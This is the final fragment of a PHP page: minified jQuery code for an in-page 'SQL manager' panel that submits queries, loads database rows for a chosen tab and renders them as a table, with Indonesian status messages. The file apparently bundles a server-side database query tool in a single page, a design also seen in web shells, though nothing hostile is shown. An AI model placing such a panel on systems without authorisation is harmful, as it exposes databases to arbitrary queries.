n=t(a.target).attr("aria-controls");(dform=t(document).find("#sqlmanager .sqltabpanel form")).find("#flimit").removeClass("d-none"),dform.find('input[name="sqlgetdata"]').val(n),dform.find('textarea[name="sqlquery"]').html(""),t.ajax({type:"post",url:dform.attr("action"),data:dform.serialize(),beforeSend:function(){dform.find("textarea, input, select").prop("disabled",!0),t(document).find("#sqlmanager select#dblists").prop("disabled",!0),t("#sqlmanager").find("#dbshowrows #"+n).html(e)},success:function(e){t("#sqlmanager").find("#dbshowrows #"+n).html("")},error:function(e,a,o){t("#sqlmanager").find("#dbshowrows #"+n).html(a+": "+o)}}).done(function(e){if(dform.find('button[type="submit"], textarea, input, select').prop("disabled",!1),t(document).find("#sqlmanager select#dblists").prop("disabled",!1),e.length>3&&o(e)){var a=JSON.parse(e),d="",s=[];Object.keys(a).forEach(t=>{var e=a[t];Array.isArray(e)&&e.length>0?(d=Object.keys(e[0]),s.push(e)):"object"==typeof e&&null!==e?(d=Object.keys(e),s.push(e)):(d=["nodata"],s.push("Belum ada data"))});var l=i(s,d);t("#sqlmanager").find("#dbshowrows #"+n).html('<div class="table-responsive text-nowrap">'+l.prop("outerHTML")+"</div>")}else t("#sqlmanager").find("#dbshowrows #"+n).html("[]"==e?"Tidak ada data!":e)})}),t(document).on("hidden.bs.modal",function(){t(".container").attr("style","filter: blur(0px);")}),t(document).on("show.bs.modal",function(){t(".container").attr("style","filter: blur(2px);")})}(jQuery);</script>
	</body>
</html>
<?php }?>